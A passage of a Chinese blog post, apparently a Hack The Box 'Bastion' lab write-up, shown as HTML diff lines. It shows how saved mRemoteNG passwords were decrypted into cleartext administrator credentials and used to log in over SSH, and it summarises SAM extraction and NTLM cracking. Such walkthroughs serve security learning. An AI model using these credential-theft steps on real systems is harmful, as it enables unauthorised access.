class="hljs-attribute">23</span>-<span class="hljs-number">02</span>-<span class="hljs-number">2019</span>  <span class="hljs-number">09</span>:<span class="hljs-number">38</span>    &lt;DIR&gt;          Windows Mail<br><span class="hljs-attribute">23</span>-<span class="hljs-number">02</span>-<span class="hljs-number">2019</span>  <span class="hljs-number">10</span>:<span class="hljs-number">22</span>    &lt;DIR&gt;          Windows Media Player<br><span class="hljs-attribute">16</span>-<span class="hljs-number">07</span>-<span class="hljs-number">2016</span>  <span class="hljs-number">14</span>:<span class="hljs-number">23</span>    &lt;DIR&gt;          Windows Multimedia Platform<br><span class="hljs-attribute">16</span>-<span class="hljs-number">07</span>-<span class="hljs-number">2016</span>  <span class="hljs-number">14</span>:<span class="hljs-number">23</span>    &lt;DIR&gt;          Windows NT<br><span class="hljs-attribute">23</span>-<span class="hljs-number">02</span>-<span class="hljs-number">2019</span>  <span class="hljs-number">10</span>:<span class="hljs-number">22</span>    &lt;DIR&gt;          Windows Photo Viewer<br><span class="hljs-attribute">16</span>-<span class="hljs-number">07</span>-<span class="hljs-number">2016</span>  <span class="hljs-number">14</span>:<span class="hljs-number">23</span>    &lt;DIR&gt;          Windows Portable Devices<br><span class="hljs-attribute">16</span>-<span class="hljs-number">07</span>-<span class="hljs-number">2016</span>  <span class="hljs-number">14</span>:<span class="hljs-number">23</span>    &lt;DIR&gt;          WindowsPowerShell<br>               <span class="hljs-attribute">0</span> File(s)              <span class="hljs-number">0</span> bytes<br>              <span class="hljs-attribute">14</span> Dir(s)   <span class="hljs-number">4.793.290.752</span> bytes free<br></code></pre></td></tr></table></figure>
+<p>ConfCons.xml信息如下，可见其中保存了用户名及密码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">mrng:Connections</span> <span class="hljs-attr">xmlns:mrng</span>=<span class="hljs-string">&quot;http://mremoteng.org&quot;</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;Connections&quot;</span> <span class="hljs-attr">Export</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">EncryptionEngine</span>=<span class="hljs-string">&quot;AES&quot;</span> <span class="hljs-attr">BlockCipherMode</span>=<span class="hljs-string">&quot;GCM&quot;</span> <span class="hljs-attr">KdfIterations</span>=<span class="hljs-string">&quot;1000&quot;</span> <span class="hljs-attr">FullFileEncryption</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">Protected</span>=<span class="hljs-string">&quot;ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA&quot;</span> <span class="hljs-attr">ConfVersion</span>=<span class="hljs-string">&quot;2.6&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">Node</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;DC&quot;</span> <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;Connection&quot;</span> <span class="hljs-attr">Descr</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">Icon</span>=<span class="hljs-string">&quot;mRemoteNG&quot;</span> <span class="hljs-attr">Panel</span>=<span class="hljs-string">&quot;General&quot;</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;500e7d58-662a-44d4-aff0-3a4f547a3fee&quot;</span> <span class="hljs-attr">Username</span>=<span class="hljs-string">&quot;Administrator&quot;</span> <span class="hljs-attr">Domain</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">Password</span>=<span class="hljs-string">&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;</span> <span class="hljs-attr">Hostname</span>=<span class="hljs-string">&quot;127.0.0.1&quot;</span> <span class="hljs-attr">Protocol</span>=<span class="hljs-string">&quot;RDP&quot;</span> <span class="hljs-attr">PuttySession</span>=<span class="hljs-string">&quot;Default Settings&quot;</span> <span class="hljs-attr">Port</span>=<span class="hljs-string">&quot;3389&quot;</span> <span class="hljs-attr">ConnectToConsole</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">UseCredSsp</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">RenderingEngine</span>=<span class="hljs-string">&quot;IE&quot;</span> <span class="hljs-attr">ICAEncryptionStrength</span>=<span class="hljs-string">&quot;EncrBasic&quot;</span> <span class="hljs-attr">RDPAuthenticationLevel</span>=<span class="hljs-string">&quot;NoAuth&quot;</span> <span class="hljs-attr">RDPMinutesToIdleTimeout</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">RDPAlertIdleTimeout</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">LoadBalanceInfo</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">Colors</span>=<span class="hljs-string">&quot;Colors16Bit&quot;</span> <span class="hljs-attr">Resolution</span>=<span class="hljs-string">&quot;FitToWindow&quot;</span> <span class="hljs-attr">AutomaticResize</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">DisplayWallpaper</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">DisplayThemes</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">EnableFontSmoothing</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">EnableDesktopComposition</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">CacheBitmaps</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">RedirectDiskDrives</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">RedirectPorts</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">RedirectPrinters</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">RedirectSmartCards</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">RedirectSound</span>=<span class="hljs-string">&quot;DoNotPlay&quot;</span> <span class="hljs-attr">SoundQuality</span>=<span class="hljs-string">&quot;Dynamic&quot;</span> <span class="hljs-attr">RedirectKeys</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">Connected</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">PreExtApp</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">PostExtApp</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">MacAddress</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">UserField</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">ExtApp</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">VNCCompression</span>=<span class="hljs-string">&quot;CompNone&quot;</span> <span class="hljs-attr">VNCEncoding</span>=<span class="hljs-string">&quot;EncHextile&quot;</span> <span class="hljs-attr">VNCAuthMode</span>=<span class="hljs-string">&quot;AuthVNC&quot;</span> <span class="hljs-attr">VNCProxyType</span>=<span class="hljs-string">&quot;ProxyNone&quot;</span> <span class="hljs-attr">VNCProxyIP</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">VNCProxyPort</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">VNCProxyUsername</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">VNCProxyPassword</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">VNCColors</span>=<span class="hljs-string">&quot;ColNormal&quot;</span> <span class="hljs-attr">VNCSmartSizeMode</span>=<span class="hljs-string">&quot;SmartSAspect&quot;</span> <span class="hljs-attr">VNCViewOnly</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">RDGatewayUsageMethod</span>=<span class="hljs-string">&quot;Never&quot;</span> <span class="hljs-attr">RDGatewayHostname</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">RDGatewayUseConnectionCredentials</span>=<span class="hljs-string">&quot;Yes&quot;</span> <span class="hljs-attr">RDGatewayUsername</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">RDGatewayPassword</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">RDGatewayDomain</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">InheritCacheBitmaps</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritColors</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritDescription</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritDisplayThemes</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritDisplayWallpaper</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritEnableFontSmoothing</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritEnableDesktopComposition</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritDomain</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritIcon</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritPanel</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritPassword</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritPort</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritProtocol</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritPuttySession</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRedirectDiskDrives</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRedirectKeys</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRedirectPorts</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRedirectPrinters</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRedirectSmartCards</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRedirectSound</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritSoundQuality</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritResolution</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritAutomaticResize</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritUseConsoleSession</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritUseCredSsp</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRenderingEngine</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritUsername</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritICAEncryptionStrength</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDPAuthenticationLevel</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDPMinutesToIdleTimeout</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDPAlertIdleTimeout</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritLoadBalanceInfo</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritPreExtApp</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritPostExtApp</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritMacAddress</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritUserField</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritExtApp</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCCompression</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCEncoding</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCAuthMode</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCProxyType</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCProxyIP</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCProxyPort</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCProxyUsername</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCProxyPassword</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCColors</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCSmartSizeMode</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCViewOnly</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDGatewayUsageMethod</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDGatewayHostname</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDGatewayUseConnectionCredentials</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDGatewayUsername</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDGatewayPassword</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDGatewayDomain</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">Node</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;L4mpje-PC&quot;</span> <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;Connection&quot;</span> <span class="hljs-attr">Descr</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">Icon</span>=<span class="hljs-string">&quot;mRemoteNG&quot;</span> <span class="hljs-attr">Panel</span>=<span class="hljs-string">&quot;General&quot;</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;8d3579b2-e68e-48c1-8f0f-9ee1347c9128&quot;</span> <span class="hljs-attr">Username</span>=<span class="hljs-string">&quot;L4mpje&quot;</span> <span class="hljs-attr">Domain</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">Password</span>=<span class="hljs-string">&quot;yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB&quot;</span> <span class="hljs-attr">Hostname</span>=<span class="hljs-string">&quot;192.168.1.75&quot;</span> <span class="hljs-attr">Protocol</span>=<span class="hljs-string">&quot;RDP&quot;</span> <span class="hljs-attr">PuttySession</span>=<span class="hljs-string">&quot;Default Settings&quot;</span> <span class="hljs-attr">Port</span>=<span class="hljs-string">&quot;3389&quot;</span> <span class="hljs-attr">ConnectToConsole</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">UseCredSsp</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">RenderingEngine</span>=<span class="hljs-string">&quot;IE&quot;</span> <span class="hljs-attr">ICAEncryptionStrength</span>=<span class="hljs-string">&quot;EncrBasic&quot;</span> <span class="hljs-attr">RDPAuthenticationLevel</span>=<span class="hljs-string">&quot;NoAuth&quot;</span> <span class="hljs-attr">RDPMinutesToIdleTimeout</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">RDPAlertIdleTimeout</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">LoadBalanceInfo</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">Colors</span>=<span class="hljs-string">&quot;Colors16Bit&quot;</span> <span class="hljs-attr">Resolution</span>=<span class="hljs-string">&quot;FitToWindow&quot;</span> <span class="hljs-attr">AutomaticResize</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">DisplayWallpaper</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">DisplayThemes</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">EnableFontSmoothing</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">EnableDesktopComposition</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">CacheBitmaps</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">RedirectDiskDrives</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">RedirectPorts</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">RedirectPrinters</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">RedirectSmartCards</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">RedirectSound</span>=<span class="hljs-string">&quot;DoNotPlay&quot;</span> <span class="hljs-attr">SoundQuality</span>=<span class="hljs-string">&quot;Dynamic&quot;</span> <span class="hljs-attr">RedirectKeys</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">Connected</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">PreExtApp</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">PostExtApp</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">MacAddress</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">UserField</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">ExtApp</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">VNCCompression</span>=<span class="hljs-string">&quot;CompNone&quot;</span> <span class="hljs-attr">VNCEncoding</span>=<span class="hljs-string">&quot;EncHextile&quot;</span> <span class="hljs-attr">VNCAuthMode</span>=<span class="hljs-string">&quot;AuthVNC&quot;</span> <span class="hljs-attr">VNCProxyType</span>=<span class="hljs-string">&quot;ProxyNone&quot;</span> <span class="hljs-attr">VNCProxyIP</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">VNCProxyPort</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">VNCProxyUsername</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">VNCProxyPassword</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">VNCColors</span>=<span class="hljs-string">&quot;ColNormal&quot;</span> <span class="hljs-attr">VNCSmartSizeMode</span>=<span class="hljs-string">&quot;SmartSAspect&quot;</span> <span class="hljs-attr">VNCViewOnly</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">RDGatewayUsageMethod</span>=<span class="hljs-string">&quot;Never&quot;</span> <span class="hljs-attr">RDGatewayHostname</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">RDGatewayUseConnectionCredentials</span>=<span class="hljs-string">&quot;Yes&quot;</span> <span class="hljs-attr">RDGatewayUsername</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">RDGatewayPassword</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">RDGatewayDomain</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">InheritCacheBitmaps</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritColors</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritDescription</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritDisplayThemes</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritDisplayWallpaper</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritEnableFontSmoothing</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritEnableDesktopComposition</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritDomain</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritIcon</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritPanel</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritPassword</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritPort</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritProtocol</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritPuttySession</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRedirectDiskDrives</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRedirectKeys</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRedirectPorts</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRedirectPrinters</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRedirectSmartCards</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRedirectSound</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritSoundQuality</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritResolution</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritAutomaticResize</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritUseConsoleSession</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritUseCredSsp</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRenderingEngine</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritUsername</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritICAEncryptionStrength</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDPAuthenticationLevel</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDPMinutesToIdleTimeout</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDPAlertIdleTimeout</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritLoadBalanceInfo</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritPreExtApp</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritPostExtApp</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritMacAddress</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritUserField</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritExtApp</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCCompression</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCEncoding</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCAuthMode</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCProxyType</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCProxyIP</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCProxyPort</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCProxyUsername</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCProxyPassword</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCColors</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCSmartSizeMode</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritVNCViewOnly</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDGatewayUsageMethod</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDGatewayHostname</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDGatewayUseConnectionCredentials</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDGatewayUsername</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDGatewayPassword</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">InheritRDGatewayDomain</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mrng:Connections</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>破解方法可以在这里找到 <a target="_blank" rel="noopener" href="https://github.com/gquere/mRemoteNG_password_decrypt">https://github.com/gquere/mRemoteNG_password_decrypt</a></p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dts">$ python3 mremoteng_decrypt.py /Users<span class="hljs-keyword">/vwv/</span>OSCP/Bastion/<span class="hljs-number">1.</span>xml<br><span class="hljs-symbol">Name:</span> DC<br><span class="hljs-symbol">Hostname:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><span class="hljs-symbol">Username:</span> Administrator<br><span class="hljs-symbol">Password:</span> thXLHM96BeKL0ER2<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">Name:</span> L4mpje-PC<br><span class="hljs-symbol">Hostname:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.75</span><br><span class="hljs-symbol">Username:</span> L4mpje<br><span class="hljs-symbol">Password:</span> bureaulampje<br></code></pre></td></tr></table></figure>
+<p>使用获取到的密码进行远程连接</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">ssh Administrator<span class="hljs-title">@10</span>.<span class="hljs-number">10.10</span>.<span class="hljs-number">134</span><br>Administrator<span class="hljs-title">@10</span>.<span class="hljs-number">10.10</span>.<span class="hljs-number">134</span>&#x27;s password:<br>Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">14393</span>]<br>(<span class="hljs-keyword">c</span>) <span class="hljs-number">2016</span> Microsoft Corporation. All rights reserved.<br><br>administrator<span class="hljs-title">@BASTION</span> C:\Users\Administrator&gt;ls<br>&#x27;ls&#x27; is not recognized as an <span class="hljs-keyword">internal</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">external</span> command<span class="hljs-punctuation">,</span><br>operable program <span class="hljs-keyword">or</span> batch file.<br><br>administrator<span class="hljs-title">@BASTION</span> C:\Users\Administrator&gt;<br></code></pre></td></tr></table></figure>
+<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><ul>
+<li>Recon: 挂载vhd的方法</li>
+<li>Shell: 提取SAM，并对NTLM进行破解</li>
+<li>Priv: mRemoteNG存在密码本地留存破解的风险</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>htb-Bastion</div>
+      <div>http://example.com/2024/12/06/htb-Bastion/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>vwv</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年12月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/31/test/" title="test">
+                        <span class="hidden-mobile">test</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
